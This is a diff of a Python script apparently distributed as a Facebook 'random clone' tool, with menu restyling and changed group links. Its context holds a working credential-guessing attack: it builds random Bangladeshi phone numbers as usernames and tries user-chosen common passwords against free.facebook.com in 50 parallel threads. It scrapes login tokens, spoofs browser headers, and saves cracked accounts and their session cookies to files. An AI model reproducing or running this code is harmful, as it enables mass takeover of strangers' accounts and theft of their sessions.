@@ -27,11 +27,12 @@ def ud():
 
     jalan(logo)
 
-    print(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;46m JOIN MY 1st GROUP')
+    print(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\x1b[1;97m JOIN MY 1st GROUP')
 
-    print(' \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\033[38;5;196m EXIT')
-
-    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m')
+    print(' \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\x1b[1;97m EXIT')
+    print('\x1b[1;97m===================================================')
+    
+    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\x1b[1;97m Choose option \033[38;5;195m: \033[38;5;46m')
 
     if opt == 'A':
 
@@ -57,7 +58,7 @@ def ND():
 
     if opt == 'A':
 
-        os.system('xdg-open https://facebook.com/groups/920428789151086/')
+        os.system('xdg-open https://facebook.com/groups/320641429966990m')
 
         o()
 
@@ -73,79 +74,53 @@ def o():
 
     jalan('\t   \033[38;5;192m👾HASAN NUMBAR TOOLS👾')
 
-    print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××')
-
-    jalan(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;46m RANDOM CLONE ')
-
-    jalan(' \033[38;5;196m[\033[38;5;195mB\033[38;5;196m]\033[38;5;46m CONTAC ADMIN')
-
-    jalan(' \033[38;5;196m[\033[38;5;195mC\033[38;5;196m]\033[38;5;46m JOIN MY 1st GROUP')
-
-    jalan(' \033[38;5;196m[\033[38;5;195mD\033[38;5;196m]\033[38;5;46m JOIN MY 2nd GROUP')
-
-    jalan(' \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\033[38;5;196m EXIT')
-    print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××')
+    print(' \x1b[1;97m===================================================')
+    jalan(' \033[38;5;196m[\033[38;5;195m01\033[38;5;196m]\033[38;5;46m RANDOM CLONE ')
+    jalan(' \033[38;5;196m[\033[38;5;195m02\033[38;5;196m]\033[38;5;46m CONTAC ADMIN')
+    jalan(' \033[38;5;196m[\033[38;5;195m03\033[38;5;196m]\033[38;5;46m JOIN MY GROUP')
+    jalan(' \033[38;5;196m[\033[38;5;195m04\033[38;5;196m]\033[38;5;196m EXIT')
+    print(' \x1b[1;97m===================================================')
 
     opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m ')
 
-    if opt == 'A':
+    if opt == '1':
 
         i()
 
-    if None == 'B':
+    if None == '2':
 
-        os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
-
-        return None
-
-    if None == 'C':
-
-        os.system('xdg-open https://facebook.com/groups/551365756758487/')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
 
         return None
 
-    if None == 'D':
+    if None == '3':
 
-        os.system('xdg-open https://facebook.com/groups/920428789151086/')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
 
         return None
 
-    if None == 'E':
+    if None == '4':
 
         os.system('exit')
 
         return None
 
     None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')
-
+    
 import os,sys,time,json,random,re,string,platform,base64,uuid
-
 os.system("git pull")
-
 from bs4 import BeautifulSoup as sop
-
 from bs4 import BeautifulSoup
-
 import requests as ress
-
 from datetime import date
-
 from datetime import datetime
-
 from time import sleep
-
 from time import sleep as waktu
-
 try:
-
     import requests
-
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
-
     import mechanize
-
     from requests.exceptions import ConnectionError
-
 except ModuleNotFoundError:
 
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
@@ -305,12 +280,12 @@ ha = current.day
 today = date.today()
 
 logo =("""
-\x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
-88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
-88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
-88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
-88 `88. 88   88 88      db   8D 88   88 88  V888 
-88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
+    \x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
+    88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
+    88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
+    88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
+    88 `88. 88   88 88      db   8D 88   88 88  V888 
+    88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
 \x1b[1;97m===================================================
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
 \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
@@ -447,16 +422,11 @@ def i():
     jalan(logo)
 
     
-    jalan(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××')
-
+    jalan(' \x1b[1;97m===================================================')
     jalan(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m BD CODES    \033[38;5;45m016, \033[38;5;46m017 ,\033[38;5;192m018 ,\033[38;5;195m019  ...\033[0;97m')
-
-    jalan(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××')
-
+    jalan(' \x1b[1;97m===================================================')
     code = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m SIM CODE\033[38;5;195m : \033[38;5;46m')
-
-    print(" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××")
-
+    print(" \x1b[1;97m===================================================")
     limit = int(input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE\033[38;5;46m: \033[38;5;195m2000, \033[38;5;46m3000, \033[38;5;45m50000, \033[38;5;46m100000\n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××× \n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m CLONING LIMIT\033[38;5;195m:\033[38;5;46m '))
 
     for nmbr in range(limit):
@@ -466,11 +436,8 @@ def i():
         user.append(nmp)
 
     os.system("clear")
-
     print(logo)
-
     passx = int(input(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Enter Password Limit\033[38;5;195m : \033[38;5;46m"))
-
     HamiiID = []
     print("")
     print(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example \033[38;5;195m: \033[38;5;46mbangladesh, \033[38;5;192mi love you, \033[38;5;45mfreefire, \033[38;5;195m12345678, Enc.")
@@ -478,9 +445,7 @@ def i():
     for bilal in range(passx):
 
         pww = input(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Enter Password\033[38;5;195m :\033[38;5;46m ")
-
         HamiiID.append(pww)
-
     with ThreadPool(max_workers=50) as manshera:
 
         clear()
@@ -488,165 +453,85 @@ def i():
         tl = str(len(user))
 
         print('\033[38;5;192m TOTAL IDS: \033[38;5;46m'+tl)
-
         print('\033[38;5;192m THE PROCESS HAS BEEN STARTED')
-
         print('\033[38;5;192m USE AEROPLANE MOOD IN EVERY 4 MIN ')
         print(' \033[38;5;45mS-Saimon \033[38;5;46m/ \033[38;5;45mH-HASAN\033[38;5;45m We Are Brother💚')
         print(' \033[38;5;46mWorking Data + Wifi ')
-
-        print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××')
-
+        print(' \x1b[1;97m===================================================')
         for love in user:
-
             pwx = [love[1:]]
-
             uid = code+love
-
             for Eman in HamiiID:
-
                 pwx.append(Eman)
-
             manshera.submit(rcrack,uid,pwx,tl)
-
-    print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××')
-
+    print(' \x1b[1;97m===================================================')
     print('\033[38;5;46mClone process has been completed')
-
     print('\033[38;5;46mIds saved in ok.txt,cp.txt')
-
-    print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××')
-
- 
-
+    print(' \x1b[1;97m===================================================')
 def rcrack(uid,pwx,tl):
-
     #print(user)
-
     global loop
-
     global cps
-
     global oks
-
     global proxy
-
     try:
-
         for ps in pwx:
-
             pro = random.choice(ugen)
-
             session = requests.Session()
-
             free_fb = session.get('https://free.facebook.com').text
-
             log_data = {
-
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-
             "try_number":"0",
-
             "unrecognized_tries":"0",
-
             "email":uid,
-
             "pass":ps,
-
             "login":"Log In"}
-
             header_freefb = {"authority": 'free.facebook.com',
-
             "method": 'GET',
-
             "scheme": 'https',
-
             "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-
             "accept-encoding": 'gzip, deflate, br',
-
             "accept-language": 'en-US,en;q=1',
-
             'cache-control': 'no-cache, no-store, must-revalidate',
-
             "referer": 'https://t.facebook.com/',
-
             "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-
             "sec-ch-ua-mobile": '?1',
-
             "sec-ch-ua-platform": "Windows",
-
             "sec-fetch-dest": 'document',
-
             "sec-fetch-mode": 'navigate',
-
             "sec-fetch-site": 'same-origin',
-
             "sec-fetch-user": '?0',
-
             "pragma": 'no-cache',
-
             "priority": 'u=0',
-
             'cross-origin-resource-policy': 'cross-origin',
-
             "upgrade-insecure-requests": '1',
-
             'user-agent':'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'}
-
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-
             log_cookies=session.cookies.get_dict().keys()
-
             if 'c_user' in log_cookies:
-
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-
                 cid = coki[7:22]
-
                 print(' \033[38;5;46m[HASAN-OK💉]  ' +uid+ ' | ' +ps+    '  \n \033[38;5;195mCookie 🍪= \033[38;5;192m'+coki+  ' \n \033[38;5;45mUsar Agent 👾= \033[38;5;126m'+pro+'  \033[0;97m')
-
                 cek_apk(session,coki)
-
                 open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
-
                 oks.append(cid)
-
                 break
-
             elif 'checkpoint' in log_cookies:
-
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-
                 cid = coki[24:39]
-
                 print( ' \033[38;5;196m[HASAN-CP💔]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
-
                 open('/sdcard/HASAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
-
                 cps.append(cid)
-
                 break
-
             else:
-
                 continue
-
         loop+=1
-
         sys.stdout.write('\r %s[HASAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
-
         sys.stdout.flush()
-
     except:
-
         pass
 
  
